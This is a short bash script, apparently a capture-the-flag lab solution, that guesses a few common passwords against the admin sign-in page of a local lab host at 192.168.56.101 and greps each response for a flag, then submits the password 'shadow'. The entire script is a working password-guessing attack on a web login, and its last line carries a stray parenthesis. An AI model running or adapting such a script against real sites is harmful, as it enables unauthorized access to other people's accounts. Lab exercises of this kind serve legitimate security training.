#!/bin/bash

password=(monkey shadow 000000)

for i in ${password[@]}; do
	echo ${i}
	curl -X POST "http://192.168.56.101/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
done

curl -s -X POST -d "username=admin&password=shadow&Login=Login" "http://192.168.56.101/index.php?page=signin")
